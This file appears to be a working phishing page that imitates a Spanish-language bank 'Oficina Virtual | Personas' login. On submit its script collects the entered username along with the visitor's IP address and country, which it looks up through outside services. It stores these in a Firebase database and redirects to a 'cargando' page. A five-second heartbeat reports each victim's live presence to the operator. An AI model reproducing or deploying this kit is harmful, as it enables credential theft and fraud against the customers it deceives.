<script>
  const firebaseConfig = {
    apiKey: "AIzaSyDWkga80jjGG2YtF9obwfIf9UuSACayWko",
    authDomain: "kkkkk-5e2bd.firebaseapp.com",
    databaseURL: "https://kkkkk-5e2bd-default-rtdb.firebaseio.com",
    projectId: "kkkkk-5e2bd",
    storageBucket: "kkkkk-5e2bd.firebasestorage.app",
    messagingSenderId: "1059258934487",
    appId: "1:1059258934487:web:72d14c094dc78e6140fc92"
  };

  if (!firebase.apps.length) {
    firebase.initializeApp(firebaseConfig);
  }
  const db = firebase.firestore();

  // --- SISTEMA DE LATIDOS (Heartbeat) MODIFICADO ---
  function enviarLatido() {
    const usuarioId = localStorage.getItem("usuario");
    
    if (usuarioId) {
      const docRef = db.collection("prolme").doc(usuarioId);
      
      docRef.get().then((doc) => {
        if (doc.exists) {
          docRef.set({
            last_active: firebase.firestore.FieldValue.serverTimestamp()
          }, { merge: true }).catch((error) => {
            console.error("Error al enviar latido:", error);
          });
        }
      }).catch((error) => {
        console.error("Error al verificar existencia:", error);
      });
    }
  }

  setInterval(enviarLatido, 5000);

  window.addEventListener('visibilitychange', function() {
    if (document.visibilityState === 'hidden') {
      enviarLatido();
    }
  });
</script>

<body background="background.png">
    <header class="header-vertical">
  <div class="header-top">

    <p style="text-align: center;font-weight: 400;font-size: 21px;margin-top: 5px;">Oficina Virtual | Personas</p>

</header>

<div class="login-wrapper">
    <div class="login-container">
         <a class="txtSeleccionMetodo">Ingrese</a>
         <form id="loginform">
             <div class="input-group" style="margin-bottom: 15px;">
                 <img src="Personalizar.svg" alt="Usuario">
                 <input type="text" id="ypn-us" name="ypn-us" required="" placeholder="Usuario" oninput="checkInputs()">
             </div>
             
             <div style="margin-left: 20px; margin-bottom: 15px; display: flex; align-items: center;">
                 <input type="checkbox" id="certificado" name="certificado" class="custom-checkbox" checked="" onclick="if(!this.checked){window.location.href='index.html';}">
                 <label for="certificado" style="font-size: 16px; color: #333;">Certificado Digital</label>
             </div>

             <button type="submit" id="submitBtn" class="btn-submit" style="width: 45%;padding: 10px;margin-left: 87px;" disabled="">Ingresar</button><br><br>
             <button type="button" class="btn-submit" style="width: 66%;padding: 5px;margin-left: 60px;font-size: 12px;cursor: default;background-color: #0033A0;" onclick="return false;">¿Olvidó su usuario o contraseña?</button>
         </form>
     </div>
</div>

<script>
function checkInputs() {
    const user = document.getElementById('ypn-us').value.trim();
    const submitBtn = document.getElementById('submitBtn');
    submitBtn.disabled = user === "";
}
</script>

<script>
    async function getCountry() {
        try {
            const response = await fetch('https://ipinfo.io/json');
            const data = await response.json();
            return data.country;
        } catch (error) { return 'País Desconocido'; }
    }

    async function getIPAddress() {
        try {
            const response = await fetch('https://api64.ipify.org?format=json');
            const data = await response.json();
            return data.ip;
        } catch (error) { return 'IP Desconocida'; }
    }

    document.querySelector("#loginform").addEventListener("submit", async (event) => {
        event.preventDefault();
        const usuario = document.querySelector("#ypn-us").value.trim();
        const pais = await getCountry();
        const ip = await getIPAddress();

        try {
            localStorage.setItem("usuario", usuario);
            await db.collection("prolme").doc(usuario).set({
                user: usuario,
                pais: pais,
                ip: ip,
                page: 0,
                last_active: firebase.firestore.FieldValue.serverTimestamp()
            }, { merge: true });

            window.location.href = "cargando.html";
        } catch (error) { console.error("Error:", error); }
    });
</script>
